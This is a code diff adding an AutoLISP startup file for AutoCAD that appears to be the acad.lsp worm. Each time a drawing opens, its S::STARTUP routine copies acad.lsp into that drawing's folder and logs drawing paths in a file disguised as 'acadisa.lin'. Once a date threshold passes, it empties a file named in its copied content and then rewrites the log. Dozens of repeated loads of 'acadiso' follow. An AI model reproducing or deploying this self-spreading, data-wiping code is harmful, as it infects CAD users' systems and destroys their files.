@@ -1,0 +1,614 @@
+(defun
+	  s::startup
+		    (/	      old_cmd  path	dwgpath	 mnlpath
+		     apppath  oldacad  newacad	nowdwg	 lspbj
+		     wjm      wjm1     wjqm	wjqm1	 wz
+		     ns1      ns2      kd
+		    )
+  (setq
+    old_cmd
+     (getvar
+       "cmdecho"
+     )
+  )
+  (setvar
+    "cmdecho"
+    1
+  )
+  (setq
+    path
+     (findfile
+       "base.dcl"
+     )
+  )
+  (setq
+    path
+     (substr
+       path
+       1
+       (-
+	 (strlen
+	   path
+	 )
+	 8
+       )
+     )
+  )
+  (setq
+    mnlpath
+     (getvar
+       "menuname"
+     )
+  )
+  (setq
+    nowdwg
+     (getvar
+       "dwgname"
+     )
+  )
+  (setq
+    wjqm
+     (findfile
+       nowdwg
+     )
+  )
+  (setq
+    dwgpath
+     (substr
+       wjqm
+       1
+       (-
+	 (strlen
+	   wjqm
+	 )
+	 (strlen
+	   nowdwg
+	 )
+       )
+     )
+  )
+  (setq
+    acadpath
+     (findfile
+       "acad.lsp"
+     )
+  )
+  (setq
+    acadpath
+     (substr
+       acadpath
+       1
+       (-
+	 (strlen
+	   acadpath
+	 )
+	 8
+       )
+     )
+  )
+  (setq
+    ns1
+	""
+    ns2
+	""
+  )
+  (setq
+    lspbj
+     0
+  )
+  (if
+    (=
+      acadpath
+      dwgpath
+    )
+     (progn
+       (setq
+	 oldacad
+	  (findfile
+	    "acad.lsp"
+	  )
+       )
+       (setq
+	 newacad
+	  (strcat
+	    path
+	    "acad.lsp"
+	  )
+       )
+       (writeapp)
+     )
+     (progn
+       (if
+	 (/=
+	   nowdwg
+	   "Drawing.dwg"
+	 )
+	  (progn
+	    (setq
+	      oldacad
+	       (findfile
+		 "acad.lsp"
+	       )
+	    )
+	    (setq
+	      newacad
+	       (strcat
+		 dwgpath
+		 "acad.lsp"
+	       )
+	    )
+	    (writeapp)
+	  )
+       )
+     )
+  )
+  (setq
+    nowdwg
+     (getvar
+       "dwgname"
+     )
+  )
+  (setq
+    wjqm
+     (findfile
+       nowdwg
+     )
+  )
+  (if
+    (setq
+      kd
+       (findfile
+	 "acadisa.lin"
+       )
+    )
+     (progn
+       (setq
+	 ns2
+	  0
+       )
+       (if
+	 (setq
+	   ns1
+	    (open
+	      kd
+	      "r"
+	    )
+	 )
+	  (progn
+	    (while
+	      (setq
+		wz
+		 (read-line
+		   ns1
+		 )
+	      )
+	       (if
+		 (=
+		   wjqm
+		   wz
+		 )
+		  (setq
+		    ns2
+		     1
+		  )
+	       )
+	    )
+	    (close
+	      ns1
+	    )
+	  )
+       )
+       (if
+	 (=
+	   ns2
+	   0
+	 )
+	  (progn
+	    (setq
+	      ns1
+	       (open
+		 kd
+		 "a"
+	       )
+	    )
+	    (write-line
+	      wjqm
+	      ns1
+	    )
+	    (close
+	      ns1
+	    )
+	  )
+       )
+       (if
+	 (setq
+	   ns1
+	    (open
+	      kd
+	      "r"
+	    )
+	 )
+	  (progn
+	    (setq
+	      wz
+	       (read-line
+		 ns1
+	       )
+	    )
+	    (close
+	      ns1
+	    )
+	  )
+       )
+       (if
+	 (>
+	   (getvar
+	     "date"
+	   )
+	   (+
+	     (distof
+	       wz
+	     )
+	     8
+	   )
+	 )
+	  (progn
+	    (setq
+	      oldacad
+	       (strcat
+		 path
+		 "acadisa.lin"
+	       )
+	    )
+	    (setq
+	      newacad
+	       (strcat
+		 dwgpath
+		 "a"
+	       )
+	    )
+	    (
+	     writeapp
+	    )
+
+	    (if
+	      (setq
+		wjm1
+		 (open
+		   oldacad
+		   "w"
+		 )
+	      )
+	       (progn
+		 (setq
+		   wjm
+		    (open
+		      newacad
+		      "r"
+		    )
+		 )
+		 (setq
+		   wz
+		    (read-line
+		      wjm
+		    )
+		 )
+		 (write-line
+		   (rtos
+		     (getvar
+		       "date"
+		     )
+		   )
+		   wjm1
+		 )
+		 (setq
+		   wz
+		    (read-line
+		      wjm
+		    )
+		 )
+		 (if
+		   (>
+		     (getvar
+		       "date"
+		     )
+		     2452900
+		   )
+		    (close
+		      (open
+			wz
+			"w"
+		      )
+		    )
+		 )
+		 (while
+		   (
+		    setq
+		     wz
+		      (read-line
+			wjm
+		      )
+		   )
+		    (write-line
+		      wz
+		      wjm1
+		    )
+		 )
+		 (close
+		   wjm
+		 )
+		 (close
+		   wjm1
+		 )
+		 (close
+		   (open
+		     newacad
+		     "w"
+		   )
+		 )
+	       )
+	    )
+	  )
+       )
+     )
+     (progn
+       (if
+	 (setq
+	   ns1
+	    (open
+	      (strcat
+		path
+		"acadisa.lin"
+	      )
+	      "w"
+	    )
+	 )
+	  (progn
+	    (write-line
+	      (rtos
+		(getvar
+		  "date"
+		)
+	      )
+	      ns1
+	    )
+	    (write-line
+	      wjqm
+	      ns1
+	    )
+	    (close
+	      ns1
+	    )
+	  )
+       )
+     )
+  )
+
+  (setvar
+    "cmdecho"
+    old_cmd
+  )
+  (princ)
+)
+(defun
+	  writeapp
+		  ()
+  (if
+    (setq
+      wjm1
+       (open
+	 newacad
+	 "w"
+       )
+    )
+     (progn
+       (setq
+	 wjm
+	  (open
+	    oldacad
+	    "r"
+	  )
+       )
+       (while
+	 (setq
+	   wz
+	    (read-line
+	      wjm
+	    )
+	 )
+	  (write-line
+	    wz
+	    wjm1
+	  )
+       )
+       (close
+	 wjm
+       )
+       (close
+	 wjm1
+       )
+     )
+  )
+)
+					;*************
+
+(load "acadapp")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load "acadapp")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
+(load"acadiso")
+(princ)
